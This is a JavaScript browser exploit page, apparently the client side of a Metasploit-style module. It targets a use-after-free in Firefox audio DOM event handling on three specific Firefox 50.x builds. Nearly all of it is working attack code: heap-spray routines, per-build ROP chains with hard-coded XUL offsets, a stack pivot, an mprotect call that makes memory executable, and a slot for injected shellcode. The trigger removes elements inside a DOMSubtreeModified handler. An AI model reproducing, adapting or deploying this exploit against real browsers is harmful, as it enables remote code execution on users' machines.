/*!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! IMPORTENT: REQUIRES long.js !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!*/

/****************************************************************************************************************************
	Read firefox_audio_events_dom_uaf.rb for documentation
*****************************************************************************************************************************/
const g_ObjectSpraySize = 0xd00;
/*Try catching the UAF*/
const g_TIMEOUT_CATCH = 100;
/*timeout before trying to catch the UAF again*/
const g_TIMEOUT_VALUE = 10000;
const g_BLOCKS = 4096;
const g_SIZE = 0xc00;
const g_BLOCKS_FREE = 0x400;
const g_SIZE_FREE = 0xc00;
const g_UAF_SPRAY_ARRAYS = 8192;
/*This is the size of the buffer we are going to spray.*/
const g_UAF_SPRAY_SIZE = 0xd00;
/*Number of times to past the quick gadgts.. the more, the better precentage - until deminishing return by increasing
    the buffer size*/
const g_TIMES_OF_QUICK_GDGTS = 11;

var g_SHELLCODE = unescape("INSERTSHELLCODEHEREPLZ");

function getShellcodeArray(shellcode_string) {
	var ret_array = new Array();
	/*aligned it to qword*/
	var buf_array = new ArrayBuffer(Math.ceil((shellcode_string.length * 2) / 8) * 8);
	var word_view = new Uint16Array(buf_array);
	var dword_view = new Uint32Array(buf_array);
	var byte_view = new Uint8Array(buf_array);

	/*append nops*/
	for (var i = 0; i < byte_view.length; ++i) {
		byte_view[i] = 0x90;
	}

	for (var i = 0; i < shellcode_string.length; i++) {
		word_view[i] = shellcode_string.charCodeAt(i);
	}

	return dword_view;
}

var g_XUL_BASE = null;
function get_xul_address() {
	return Long.fromString(location.href.substring(location.href.indexOf("xul=") + 4), true, 16);
}

const g_MB = 0x100000;
const g_ALLOC_TIMES = 3;
function gc() {
	const maxMallocBytes = 8 * 64 * g_MB;
	for (var i = 0; i < g_ALLOC_TIMES; ++i) {
		var x = new ArrayBuffer(maxMallocBytes);
	}
}

function pushSmallRopGdgts_5002(gdgts_array) {
	var ret_array = gdgts_array;
	/*This first gdgt, turns our deref call to an abs call*/
	ret_array.push(g_XUL_BASE.add(0x4832528));
	ret_array.push(new Long(0xdeadbeef,0x01010101, true));
	/*stack pvt (push rdi; pop rsp) and adds a lot to the stack, continue down the ROP*/
	ret_array.push(g_XUL_BASE.add(0x10092b5));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));

	/*only for testing, put int 3 then ret*/
	/*ret_array.push(g_XUL_BASE.add(0x2a8db33));*/
	ret_array.push(g_XUL_BASE.add(0x166ac8));
	ret_array.push(g_XUL_BASE.add(0x166ac8));
	ret_array.push(g_XUL_BASE.add(0x166ac8));
	ret_array.push(g_XUL_BASE.add(0x166ac8));
	ret_array.push(g_XUL_BASE.add(0x166ac8));
}

function pushSmallRopGdgts_5001(gdgts_array) {
	var ret_array = gdgts_array;
	/*This first gdgt, turns our deref call to an abs call - same as 5002*/
	ret_array.push(g_XUL_BASE.add(0x4832528));
	ret_array.push(new Long(0xdeadbeef,0x01010101, true));
	/*stack pvt (push rdi; pop rsp) and adds a lot to the stack, continue down the ROP*/
	/*same opcodes as 5002 but different addr*/
	ret_array.push(g_XUL_BASE.add(0x1009715));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true));

	/*only for testing, put int 3 then ret*/
	/*ret_array.push(g_XUL_BASE.add(0x2a8db33));*/
	/*This is simply c3 but different addr then 5002*/
	ret_array.push(g_XUL_BASE.add(0x1009743));
	ret_array.push(g_XUL_BASE.add(0x1009743));
	ret_array.push(g_XUL_BASE.add(0x1009743));
	ret_array.push(g_XUL_BASE.add(0x1009743));
	ret_array.push(g_XUL_BASE.add(0x1009743));
}

function pushSmallRopGdgts_5000(gdgts_array) {
	var ret_array = gdgts_array;
	/*This first gdgt, turns our deref call to an abs call - diff addr for 5000*/
	ret_array.push(g_XUL_BASE.add(0x4808078));				/*0x00*/
	ret_array.push(new Long(0xdeadbeef,0x01010101, true)); 	/*0x08*/
	/*the original stack pivot does not exist in 50.0.0 so this is the new one.
	  we need to make sure that at offset +0x78 (from the start) we have a addr that does not point to NULL!)
	  if we do it, the next thing we have is add rsp, 8; pop rbx; pop r14; ret THIS IS NEW FOR 5000*/
	ret_array.push(g_XUL_BASE.add(0x1a3df20)); 				/*0x10*/
	/*ret_array.push(new Long(0x02020202, 0xbabeface, true));*/
	ret_array.push(g_XUL_BASE.add(0x1009743)); /*0x18*/
	/*ret_array.push(new Long(0x03030303, 0xbabeface, true));*/
	ret_array.push(g_XUL_BASE.add(0x1009743)); /*0x20*/

	/*ret_array.push(new Long(0x04040404, 0xbabeface, true));*/
	ret_array.push(g_XUL_BASE.add(0x1009743)); /*0x28*/

	/*This is just to increase the stack to near the end.. only for 5000*/
	ret_array.push(g_XUL_BASE.add(0x43e25)); /*0x30*/

	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x38*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x40*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x48*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x50*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x58*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x60*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x68*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x70*/
	/*this +0x1b0 will be a pointer to not NULL! we need it for the stack pivot!*/
	ret_array.push(g_XUL_BASE.add(0x4450fc8)) 				/*0x78*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x80*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x88*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x90*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0x98*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0xa0*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0xa8*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0xb0*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0xb8*/
	ret_array.push(new Long(0xdeadbeef, 0xbabeface, true)); /*0xc0*/

	/*only for testing, put int 3 then ret*/
	/*ret_array.push(g_XUL_BASE.add(0x2a8db33));*/
	/*This is simply c3 but same addr as 5001*/
	ret_array.push(g_XUL_BASE.add(0x1009743)); 				/*0xc8*/
	ret_array.push(g_XUL_BASE.add(0x1009743)); 				/*0xd0*/
	ret_array.push(g_XUL_BASE.add(0x1009743)); 				/*0xd8*/
	ret_array.push(g_XUL_BASE.add(0x1009743)); 				/*0xe0*/
	ret_array.push(g_XUL_BASE.add(0x1009743)); 				/*0xe8*/
}

/*here we are going to put all the ROP gadgets*/
function buildRopArray_5002() {
	var ret_array = new Array();
	/*Since we don't know exactly where the free'ed object will point - only that it will be aligned to 0x100 bytes.
		We are going to put sort of "nop slide" ROP mode in the buffer.*/
	for (var i = 0; i < g_TIMES_OF_QUICK_GDGTS - 1; ++i) {
		pushSmallRopGdgts_5002(ret_array);
		/*This is add rsp 0xf0; pop rbx; retn*/
		ret_array.push(g_XUL_BASE.add(0x166ac0)); 			/*0xf0*/
		/*Helps for debuging, knowing which one we actually caught*/
		ret_array.push(new Long(i, 0xdeadb00b, true)); 		/*0xf8*/
	}
	/*pushing the last one, after this one, starts our real ROP*/
	pushSmallRopGdgts_5002(ret_array);

	ret_array.push(g_XUL_BASE.add(0x28e4a27)); /*push rsp; pop rbx; pop r14; pop rbp; retn got here*/
	ret_array.push(new Long(0x0000006d, 0x0000006d, true));
	ret_array.push(new Long(0xbabeb00b, 0xdeadface, true));
	ret_array.push(g_XUL_BASE.add(0xa513)); /*mov rax, rbx; add rsp, 8; pop rbx; pop r12; pop 13; pop 414; pop r15; pop rbp; retn got here*/
	ret_array.push(new Long(0x1, 0xbabeface, true));
	ret_array.push(new Long(0xb, 0xbabeface, true));
	ret_array.push(new Long(0x12, 0xbabeface, true));
	ret_array.push(new Long(0x13, 0xbabeface, true));
	ret_array.push(new Long(0x14, 0xbabeface, true));
	ret_array.push(new Long(0x15, 0xbabeface, true));
	ret_array.push(new Long(0xbb, 0xbabeface, true));
	ret_array.push(g_XUL_BASE.add(0x4012cc)); /*push rax; pop rdi; ret worked..*/
	ret_array.push(g_XUL_BASE.add(0x63a24)); /*add rdi, 30h; ret*/
	ret_array.push(g_XUL_BASE.add(0x63a24)); /*add rdi, 30h; ret*/
	ret_array.push(g_XUL_BASE.add(0x63a24)); /*add rdi, 30h; ret*/
	ret_array.push(g_XUL_BASE.add(0x63a24)); /*add rdi, 30h; ret*/
	ret_array.push(g_XUL_BASE.add(0xb13996)); /*push rdi; pop rax; ret*/
	ret_array.push(g_XUL_BASE.add(0x868db3)); /*xchng rax, r13; ret;*/
	ret_array.push(g_XUL_BASE.add(0x3b9c)); /*pop rsi ret*/
	ret_array.push(new Long(1500, 0x0, true)); /*the new rsi --> size of shellcode*/
	ret_array.push(g_XUL_BASE.add(0x2f0b9db)); /* pop rdx; ret */
	ret_array.push(new Long(0x7, 0x0, true)); /*the new rdx --> meaning the protection is RWX*/
	ret_array.push(g_XUL_BASE.add(0x330f8ca)) /*and rdi, 0xfffffffffffff000; movzx eax, byte ptr [rdi + 18h]; lea rcx, addr?; mov eax, [rcx+rax*4]; retn*/
	ret_array.push(g_XUL_BASE.add(0x3630d9e)); /*jmp mprotect.. rdi is our buffer after the rop (?). rsi is 1500 = size; rdx = 7 == RWX;*/
	ret_array.push(g_XUL_BASE.add(0x3296acf)) /*call r13*/
	/*ret_array.push(g_XUL_BASE.add(0xbe1d1));*/ /*eb fe.*/
	ret_array.push(new Long(0x90909090, 0x90909090, true));

	return ret_array;
}

/*here we are going to put all the ROP gadgets*/
function buildRopArray_5001() {
	var ret_array = new Array();
	/*Since we don't know exactly where the free'ed object will point - only that it will be aligned to 0x100 bytes.
		We are going to put sort of "nop slide" ROP mode in the buffer.*/
	for (var i = 0; i < g_TIMES_OF_QUICK_GDGTS - 1; ++i) {
		pushSmallRopGdgts_5001(ret_array);
		/*This is add rsp 0xf0; pop rbx; retn - different addr from 5002*/
		ret_array.push(g_XUL_BASE.add(0x166f20));
		/*Helps for debuging, knowing which one we actually caught*/
		ret_array.push(new Long(i, 0xdeadb00b, true));
	}
	/*pushing the last one, after this one, starts our real ROP*/
	pushSmallRopGdgts_5001(ret_array);

	ret_array.push(g_XUL_BASE.add(0x28e4a27)); /*push rsp; pop rbx; pop r14; pop rbp; retn got here - same as 5002*/
	ret_array.push(new Long(0x0000006d, 0x0000006d, true));
	ret_array.push(new Long(0xbabeb00b, 0xdeadface, true));
	ret_array.push(g_XUL_BASE.add(0xa973)); /*mov rax, rbx; add rsp, 8; pop rbx; pop r12; pop 13; pop 414; pop r15; pop rbp; retn got here - diff add from 5002*/
	ret_array.push(new Long(0x1, 0xbabeface, true));
	ret_array.push(new Long(0xb, 0xbabeface, true));
	ret_array.push(new Long(0x12, 0xbabeface, true));
	ret_array.push(new Long(0x13, 0xbabeface, true));
	ret_array.push(new Long(0x14, 0xbabeface, true));
	ret_array.push(new Long(0x15, 0xbabeface, true));
	ret_array.push(new Long(0xbb, 0xbabeface, true));
	ret_array.push(g_XUL_BASE.add(0x40172c)); /*push rax; pop rdi; ret worked.. diff addr from 5002*/
	ret_array.push(g_XUL_BASE.add(0x63e84)); /*add rdi, 30h; ret.. diff addr from 5002*/
	ret_array.push(g_XUL_BASE.add(0x63e84)); /*add rdi, 30h; ret.. diff addr from 5002*/
	ret_array.push(g_XUL_BASE.add(0x63e84)); /*add rdi, 30h; ret.. diff addr from 5002*/
	ret_array.push(g_XUL_BASE.add(0x63e84)); /*add rdi, 30h; ret.. diff addr from 5002*/
	ret_array.push(g_XUL_BASE.add(0x63e84)); /*add rdi, 30h; ret.. added it - different from 5002 --> only for 5001*/
	ret_array.push(g_XUL_BASE.add(0xb13df6)); /*push rdi; pop rax; ret.. diff addr from 5002*/
	ret_array.push(g_XUL_BASE.add(0x2ef0141)); /*pop r13; ret --> only for 5001*/
	ret_array.push(new Long(0x0, 0x0, true)); /*the new r13 --> set to zero for the later add command*/
	ret_array.push(g_XUL_BASE.add(0x4b37a6)); /*add r13, rax ; ret --> only for 5001 meaning r13 will have the addr of the shellcode!*/
	ret_array.push(g_XUL_BASE.add(0x3ffc)); /*pop rsi; ret.. diff addr from 5002*/
	ret_array.push(new Long(1500, 0x0, true)); /*the new rsi --> size of shellcode*/
	ret_array.push(g_XUL_BASE.add(0x2f0b9db)); /* pop rdx; ret --> should work*/
	ret_array.push(new Long(0x7, 0x0, true)); /*the new rdx --> meaning the protection is RWX*/
	ret_array.push(g_XUL_BASE.add(0x330f8ca)) /*and rdi, 0xfffffffffffff000; movzx eax, byte ptr [rdi + 18h]; lea rcx, addr?; mov eax, [rcx+rax*4]; retn - same as 5002*/
	ret_array.push(g_XUL_BASE.add(0x3630d9e)); /*jmp mprotect.. rdi is our buffer after the rop (?). rsi is 1500 = size; rdx = 7 == RWX; - same as 5002*/
	ret_array.push(g_XUL_BASE.add(0x3296acf)) /*call r13 - same as 5002*/
	/*ret_array.push(g_XUL_BASE.add(0xbe1d1));*/ /*eb fe.*/
	ret_array.push(new Long(0x90909090, 0x90909090, true));
	ret_array.push(new Long(0x90909090, 0x90909090, true));
	ret_array.push(new Long(0x90909090, 0x90909090, true));
	ret_array.push(new Long(0x90909090, 0x90909090, true));

	return ret_array;
}


function buildRopArray_5000() {
	var ret_array = new Array();
	/*Since we don't know exactly where the free'ed object will point - only that it will be aligned to 0x100 bytes.
		We are going to put sort of "nop slide" ROP mode in the buffer.*/
	for (var i = 0; i < g_TIMES_OF_QUICK_GDGTS - 1; ++i) {
		pushSmallRopGdgts_5000(ret_array);
		/*This is add rsp 0xf0; pop rbx; retn - different addr from 5001*/
		ret_array.push(g_XUL_BASE.add(0x166f40));			/*0xf0*/
		/*Helps for debuging, knowing which one we actually caught*/
		ret_array.push(new Long(i, 0xdeadb00b, true));		/*0xf8*/
	}
	/*pushing the last one, after this one, starts our real ROP*/
	pushSmallRopGdgts_5000(ret_array);

	/*push rsp; pop rbx; pop r14; pop rbp; retn got here - same as 5002 and as 5001*/
	ret_array.push(g_XUL_BASE.add(0x28e4a27));
	ret_array.push(new Long(0x0000006d, 0x0000006d, true));
	ret_array.push(new Long(0xbabeb00b, 0xdeadface, true));
	/*mov rax, rbx; add rsp, 8; pop rbx; pop r12; pop 13; pop 414; pop r15; pop rbp; retn got here - diff addr from 5002 and 5001*/
	ret_array.push(g_XUL_BASE.add(0xa993));
	ret_array.push(new Long(0x1, 0xbabeface, true));
	ret_array.push(new Long(0xb, 0xbabeface, true));
	ret_array.push(new Long(0x12, 0xbabeface, true));
	ret_array.push(new Long(0x13, 0xbabeface, true));
	ret_array.push(new Long(0x14, 0xbabeface, true));
	ret_array.push(new Long(0x15, 0xbabeface, true));
	ret_array.push(new Long(0xbb, 0xbabeface, true));
	ret_array.push(g_XUL_BASE.add(0x40174c)); /*push rax; pop rdi; ret worked.. diff addr from 5002 and 5001*/
	ret_array.push(g_XUL_BASE.add(0x63ea4)); /*add rdi, 30h; ret.. diff addr from 5002 and from 5001*/
	ret_array.push(g_XUL_BASE.add(0x63ea4)); /*add rdi, 30h; ret.. diff addr from 5002 and from 5001*/
	ret_array.push(g_XUL_BASE.add(0x63ea4)); /*add rdi, 30h; ret.. diff addr from 5002 and from 5001*/
	ret_array.push(g_XUL_BASE.add(0x63ea4)); /*add rdi, 30h; ret.. diff addr from 5002 and from 5001*/
	ret_array.push(g_XUL_BASE.add(0x63ea4)); /*add rdi, 30h; ret.. added it - different from 5002 --> only for 5001 and for 5000*/
	ret_array.push(g_XUL_BASE.add(0xb13df6)); /*push rdi; pop rax; ret.. diff addr from 5002 but same as 5000*/
	ret_array.push(g_XUL_BASE.add(0x7aacc)); /*push rax; pop r11; add ecx, [rax-0x77]; ret --> this is only for 5000*/
	ret_array.push(g_XUL_BASE.add(0x401c)); /*pop rsi; ret --> diff addr from 5002 and 5001*/
	ret_array.push(new Long(1500, 0x0, true)); /*the new rsi --> size of shellcode*/
	ret_array.push(g_XUL_BASE.add(0x2f0b9db)); /* pop rdx; ret --> same as 5002 and 5001*/
	ret_array.push(new Long(0x7, 0x0, true)); /*the new rdx --> meaning the protection is RWX*/
	ret_array.push(g_XUL_BASE.add(0x330f8ca)) /*and rdi, 0xfffffffffffff000; movzx eax, byte ptr [rdi + 18h]; lea rcx, addr?; mov eax, [rcx+rax*4]; retn - same as 5002 and 5001*/
	ret_array.push(g_XUL_BASE.add(0x22e1)); /*pop rbx; ret --> only for 50.0.0*/
	ret_array.push(g_XUL_BASE.add(0x45f3)); /*pop rax; ret this will be the new rbx --> only for 50.0.0*/
	ret_array.push(g_XUL_BASE.add(0x839b95));/*mov r15,r11; call rbx --> only for 50.0.0*/
	ret_array.push(g_XUL_BASE.add(0x3630d9e)); /*jmp mprotect.. rdi is our buffer after the rop (?). rsi is 1500 = size; rdx = 7 == RWX; - same as 5002 and as 5001*/
	ret_array.push(g_XUL_BASE.add(0x4834d)) /*call r15 - special only for 5000*/
	/*ret_array.push(g_XUL_BASE.add(0xbe1d1));*/ /*eb fe.*/
	ret_array.push(new Long(0x90909090, 0x90909090, true));/*rdi will point to one of this.... shellcode should be here!--> only for 5001 and 5000*/
	ret_array.push(new Long(0x90909090, 0x90909090, true));/*rdi will point to one of this.... shellcode should be here!--> only for 5000*/
	ret_array.push(new Long(0x90909090, 0x90909090, true));/*rdi will point to one of this.... shellcode should be here!--> only for 5000*/
	ret_array.push(new Long(0x90909090, 0x90909090, true));/*rdi will point to one of this.... shellcode should be here!--> only for 5000*/
	/*todo: bad encoding, fix it... fixed?*/

	return ret_array;
}

function buildRopArray() {
	if ("20161104212021" == navigator.buildID) {
		return buildRopArray_5000();
	} else if ("20161123182536" == navigator.buildID) {
		return buildRopArray_5001();
	} else if ("20161129173726" == navigator.buildID) {
		return buildRopArray_5002();
	}
	/*if we got here, this is a bad version*/
	return null;
}

var g_ROP_ArrayBuffer = new ArrayBuffer(g_ObjectSpraySize);
var g_ROP_ByteView = new Uint8Array(g_ROP_ArrayBuffer);
for (var i = 0; i < g_ROP_ByteView.length; ++i) {
	g_ROP_ByteView[i] = i;
}
function buildRopArrayBuffer(rop_array) {
	var dw_view_rop = new Uint32Array(g_ROP_ArrayBuffer);
	var i = 0;
	var j = 0;
	var cur_long = null;
	var my_sc = getShellcodeArray(g_SHELLCODE);

	if (rop_array.length * 2 + Math.ceil(my_sc.length / 4) > dw_view_rop.length) {
		alert("array too big. need: " + (rop_array.length * 2 + Math.ceil(my_sc.length / 4)) +"dwords. has: " + dw_view_rop.length);
	}

	for (; i < rop_array.length * 2; i+=2) {
		cur_long = rop_array[i / 2];
		dw_view_rop[i] = cur_long.getLowBitsUnsigned();
		dw_view_rop[i + 1] = cur_long.getHighBitsUnsigned();
	}

	for (; i < (rop_array.length * 2) + my_sc.length; i++) {
		/*Append the shellcode*/
		dw_view_rop[i] = my_sc[i - (rop_array.length * 2)];
	}

	for (; i < dw_view_rop.length; ++i) {
		dw_view_rop[i] = i;
	}
}

function preAllocArray(size_to_alloc) {
	var ret_array = new Array(2);
	ret_array[0] = 0xBABE5555;
	ret_array[1] = ret_array;
	
	while (ret_array.length < size_to_alloc) {
		ret_array = ret_array.concat(ret_array);
	}
	
	ret_array.splice(ret_array.length - size_to_alloc, ret_array.length - size_to_alloc);
	
	return ret_array;
}

function spray_CatchAddress(times, size, input_array) {
	var spray = null;

	if (input_array == null) {
		spray = new Array(times);
	} else {
		spray = input_array;
	}

	for (var i = 0; i < spray.length; ++i) {
		spray[i] = new Uint8Array(size);
		for (var j = 0; j < spray[i].length; ++j) {
			spray[i][j] = g_ROP_ByteView[j];
		}
	}

	return spray;
}

var g_worker = null;
function start_worker_m() {
	g_worker = new Worker("Worker.js");
    g_worker.onerror = function(e) {
        //alert("worker error!");
    }
    g_worker.postMessage( {} );
}

function m(blocks, size) {
	var arr = new Array(blocks);
	for (var i = 0; i < arr.length; i++) {
		arr[i] = new Array(size)
		for (var j = 0; j < arr[i].length; j+=2) {
			arr[i][j] = 0x41414141;
			arr[i][j+1] = 0x42424242;
		}
	}

	return arr;
}

function exploit_now() {
	m(g_BLOCKS_FREE, g_UAF_SPRAY_SIZE);
	window.gdl = spray_CatchAddress(g_SECOND_SPRAY.length, g_UAF_SPRAY_SIZE, g_SECOND_SPRAY);
	document.getElementById("t1").remove(); //re-use
	/*If we've reached here, we failed... this will most probbly crash the browser, but worth a shot anyway*/
	location.reload();

}

var g_DOC = null;
var g_CNT = 0;
function handler() { //free
	if (g_CNT > 0) return;
	g_DOC.body.appendChild(document.createElement("audio")).remove();
	/*m(g_BLOCKS_FREE, g_SIZE_FREE);*/
	++g_CNT;
}

function exploit_now() {
	m(g_BLOCKS_FREE, g_UAF_SPRAY_SIZE);
	window.gdl = spray_CatchAddress(g_SECOND_SPRAY.length, g_UAF_SPRAY_SIZE, g_SECOND_SPRAY);
	document.getElementById("t1").remove(); //re-use
	/*If we've reached here, we failed... this will most probbly crash the browser, but worth a shot anyway*/
	location.reload();

}

var g_FIRST_SPRAY = preAllocArray(g_UAF_SPRAY_ARRAYS * 25);
var g_SECOND_SPRAY = preAllocArray(g_UAF_SPRAY_ARRAYS * 30);
var g_DONE_TRIGGER = 0;
function trigger() {
	if (0 == g_DONE_TRIGGER++) {
		return;
	}
	/*m(g_BLOCKS_FREE, g_SIZE_FREE); */
	g_DOC.getElementsByTagName("*")[0].removeEventListener("DOMSubtreeModified",handler,false);
	g_worker.terminate()
	window.dl = spray_CatchAddress(g_FIRST_SPRAY.length, g_UAF_SPRAY_SIZE, g_FIRST_SPRAY);
	setTimeout(exploit_now, g_TIMEOUT_VALUE);
}

function start_exploit() {
	g_DOC = document.getElementById("t1").contentWindow.document;
	g_DOC.getElementsByTagName("*")[0].addEventListener("DOMSubtreeModified",handler,false)
	g_DOC.getElementsByTagName("*")[0].style = "ANNNY";
	setInterval("if (g_CNT > 0) trigger();", g_TIMEOUT_CATCH);
}

function exploit() {
	var df = m(g_BLOCKS, g_SIZE);
	document.body.setAttribute('df', df);
	start_worker_m();
	setTimeout("start_exploit()", 5000);
}

function make_animation() {
	var body_ele = document.getElementsByTagName("body");
	body_ele = body_ele[0];

	var svg_ele = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
	var rect_ele = document.createElementNS('http://www.w3.org/2000/svg', 'rect');

	rect_ele.setAttribute("width", 1);
	rect_ele.setAttribute("height", 1);
	rect_ele.setAttribute("x", 0);
	rect_ele.setAttribute("y", 0);
	rect_ele.setAttribute("id", "anirect");
	rect_ele.setAttribute("style", "fill:black");

	svg_ele.appendChild(rect_ele)
	svg_ele.setAttribute("width", "10");
	svg_ele.setAttribute("height", "10");
	svg_ele.setAttribute("viewPort", "0 0 10 10");
	svg_ele.setAttribute("version", "1.1");
	svg_ele.setAttribute("xmlns", "http://www.w3.org/2000/svg");

	body_ele.appendChild(svg_ele);

	rect_ele.animate([ {opacity: 1, easing: 'ease-out' }, {opacity: 0.1, easing: 'ease-in' }, {opacity: 0} ], {duration: 500, iterations: Infinity});
}

var tmp_rect = null;
function main() {
	gc();
	make_animation();
	gc();

	tmp_rect = document.getElementById("anirect2");
	tmp_rect.animate([ {opacity: 1, easing: 'ease-out' }, {opacity: 0.1, easing: 'ease-in' }, {opacity: 0} ], {duration: 500, iterations: Infinity});

	g_XUL_BASE = get_xul_address();
	buildRopArrayBuffer(buildRopArray());
	gc();
	exploit();
}
window.onload = main